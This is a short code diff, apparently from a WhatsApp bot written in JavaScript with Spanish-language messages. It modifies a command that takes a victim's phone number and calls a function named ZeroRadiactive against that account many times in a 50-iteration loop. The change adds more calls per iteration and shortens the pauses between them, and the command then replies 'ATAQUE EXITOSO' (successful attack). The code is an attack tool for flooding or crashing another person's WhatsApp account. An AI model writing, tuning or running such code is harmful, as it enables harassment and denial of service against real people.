@@ -784,12 +784,23 @@ if (!q) return reply(`ejemplo: ${prefix + command} 52×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 for (let i = 0; i < 50; i++) {
 await ZeroRadiactive(target)
-await sleep(5000)
+await sleep(4000)
+await ZeroRadiactive(target)
+await sleep(4000)
+await ZeroRadiactive(target)
+await sleep(4000)
+await ZeroRadiactive(target)
+await sleep(4000)
 await ZeroRadiactive(target)
 await sleep(5000)
 await ZeroRadiactive(target)
-await sleep(5000)
+await sleep(4000)
 await ZeroRadiactive(target)
+await sleep(4000)
+await ZeroRadiactive(target)
+await sleep(4000)
+await ZeroRadiactive(target)
+await sleep(4000)
 }
 reply(`『 𝐀𝐓𝐀𝐐𝐔𝐄 𝐄𝐗𝐢𝐓𝐎𝐒𝐎 』
 
